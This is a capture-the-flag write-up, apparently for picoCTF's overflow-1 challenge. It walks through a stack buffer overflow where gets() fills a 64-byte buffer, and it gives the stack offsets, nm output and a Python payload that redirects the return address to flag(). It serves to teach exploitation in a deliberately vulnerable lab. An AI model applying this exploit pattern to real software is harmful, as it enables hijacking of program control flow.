- - - -
### Problem:
You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_2_305519bf80dcdebd46c8950854760999 on the shell server. Source.

- - - -
### Goal:
Get address of flag function. Buffer overlow.

- - - -
### Solution:
We want to hijack the control flow and execute the `flag()` function to win. To do so, we will perform a buffer overflow on the `vuln()` function.

Again, the `vuln()` function is a classic vulnerability to a buffer overflow. It is getting an unlimited and unchecked input from the user. In this case `BUFFSIZE=64`. We can write more than 64 bytes and overwrite the stored return address.
```c
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}
```

How far is the stored return address? I used IdaFree to run the program and observe the stack. As shown below, we will need to write (64 + 4 + 4 + 4) of filler data. Then we will need to write the return address to the stack in little endian.
```
64 bytes  # buffer
4 bytes   # data -> .rodata:aFlagFileIsMiss+54
4 bytes   # data -> .got.plt:_GLOBAL_OFFSET_TABLE_
4 bytes   # data -> [stack]:FFC6C628
4 bytes   # return address
```

What is the return address? We can find this by running `nm ./vuln` which will list the addresses of the symbols associated with vuln. This will show the following.
```bash
$ nm vuln
...
0804865f T vuln
...
080485e6 T flag
```

Based on the above information, I built the following exploit
```python
cmd = b'A' * 64  # buffer
cmd += b'B' * 4  # data -> .rodata:aFlagFileIsMiss+54
cmd += b'C' * 4  # data -> .got.plt:_GLOBAL_OFFSET_TABLE_
cmd += b'D' * 4  # data -> [stack]:FFC6C628
cmd += p32(0x080485e6)  # overwrite return
```